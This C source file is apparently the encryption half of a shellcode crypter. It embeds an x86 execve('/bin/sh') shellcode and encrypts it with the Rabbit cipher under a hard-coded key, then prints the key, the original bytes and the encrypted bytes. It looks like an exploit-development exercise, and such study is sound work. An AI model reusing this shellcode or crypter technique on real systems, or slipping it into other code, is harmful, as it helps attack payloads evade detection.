// File: encrypt2rabbit.c
// Author: Petr Javorik

#include <string.h>
#include <stdio.h>
#include "rabbit/code/rabbit.c"

// Unencrypted shellcode
unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
// Encryption key must be exactly 16 bytes
char key[16] = {'s', 'o', 'm', 'e', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'k', 'e', 'y', 'y', 'y'};


int main()
{
    // Initialize ECRYPT library
    ECRYPT_init();
    // ctx is object containing settings and state of encryption engine
    ECRYPT_ctx ctx;
    // Load key
    ECRYPT_keysetup(&ctx, key, 128, 0);
    // Encrypt
    u8 encrypted[200];
    int codeLen = strlen(code);
    ECRYPT_process_bytes(0, &ctx, code, encrypted, codeLen);

    // Print result
    int i;
    printf("Encryption Key = ");
    for (i=0; i<16; i++)
        printf("%c", key[i]);
    printf("\n");

    printf("Original       = ");
    for (i=0; i<codeLen; i++)
        printf("\\x%02x", code[i]);
    printf("\n");

    printf("Encrypted      = ");
    for (i=0; i<codeLen; i++)
        printf("\\x%02x", encrypted[i]);
    printf ("\n");

    return 0;
}
